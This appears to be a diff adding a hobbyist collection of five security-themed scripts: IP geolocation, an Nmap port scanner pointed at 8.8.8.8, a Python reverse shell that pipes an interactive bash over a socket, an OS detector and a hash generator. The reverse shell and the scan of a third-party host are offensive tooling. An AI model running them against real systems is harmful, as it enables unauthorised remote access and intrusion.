@@ -1,0 +1,143 @@
+#Python script that identifies the country, city, country code and continent name for a list of IP addresses.
+
+import json
+from urllib.request import urlopen
+
+# Mapping of country codes to continents
+CONTINENTS = {
+    'AF': 'Africa',
+    'AS': 'Asia',
+    'EU': 'Europe',
+    'NA': 'North America',
+    'OC': 'Oceania',
+    'SA': 'South America',
+    'AN': 'Antarctica'
+}
+
+# Mapping of country codes to continents
+COUNTRY_TO_CONTINENT = {
+    'US': 'NA',
+    'GB': 'EU',
+    'DE': 'EU',
+    'IN': 'AS',
+    'AU': 'OC',
+    'CN': 'AS',
+    
+    # Add more country codes here
+}
+
+def get_location(ip_addresses):
+    for ip in ip_addresses:
+        url = f'http://ip-api.com/json/{ip}'
+        response = urlopen(url)
+        data = json.load(response)
+        print(f'IP: {ip}')
+        print(f'Country: {data["country"]}')
+        print(f'City: {data["city"]}')
+        print(f'Country Code: {data["countryCode"]}')
+        continent = COUNTRY_TO_CONTINENT.get(data["countryCode"], "Unknown")
+        print(f'Continent: {CONTINENTS.get(continent, "Unknown")}')
+        print('-------------------------')
+
+ip_addresses = ['8.8.8.8', '8.8.4.4', '1.0.1.0']  # replace with your list of IPs
+get_location(ip_addresses)
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Network scanner with Nmap
+
+import nmap
+
+def scan_network(ip, ports):
+    nm = nmap.PortScanner()
+    nm.scan(ip, ports)
+    for host in nm.all_hosts():
+        print('----------------------------------------------------')
+        print('Host : %s (%s)' % (host, nm[host].hostname()))
+        print('State : %s' % nm[host].state())
+        for proto in nm[host].all_protocols():
+            print('----------')
+            print('Protocol : %s' % proto)
+            lport = nm[host][proto].keys()
+            for port in lport:
+                print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
+
+scan_network('8.8.8.8', '22-443')
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Reverse shell with a python script
+
+import socket
+from os import dup2
+from subprocess import run
+
+# Server host and port
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = 5003
+
+# Create a socket object
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Connect to the server
+s.connect((SERVER_HOST, SERVER_PORT))
+
+# Redirect stdin, stdout and stderr to the socket
+dup2(s.fileno(), 0)
+dup2(s.fileno(), 1)
+dup2(s.fileno(), 2)
+
+# Execute the shell
+run(["/bin/bash", "-i"])
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Detect OS with BASH
+
+#!/bin/bash
+
+# Detect the OS
+OS="`uname`"
+case $OS in
+  'Linux')
+    OS='Linux'
+    ;;
+  'FreeBSD')
+    OS='FreeBSD'
+    ;;
+  'WindowsNT')
+    OS='Windows'
+    ;;
+  'Darwin') 
+    OS='Mac'
+    ;;
+  'SunOS')
+    OS='Solaris'
+    ;;
+  'AIX') ;;
+  *) ;;
+esac
+
+echo $OS
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Hash generator with Bash
+
+#!/bin/bash
+
+# Ask for input
+echo "Enter the text you want to hash:"
+read text
+
+# Generate MD5 hash
+md5hash=$(echo -n "$text" | md5sum | awk '{print $1}')
+echo "MD5: $md5hash"
+
+# Generate SHA1 hash
+sha1hash=$(echo -n "$text" | sha1sum | awk '{print $1}')
+echo "SHA1: $sha1hash"
+
+# Generate SHA256 hash
+sha256hash=$(echo -n "$text" | sha256sum | awk '{print $1}')
+echo "SHA256: $sha256hash"
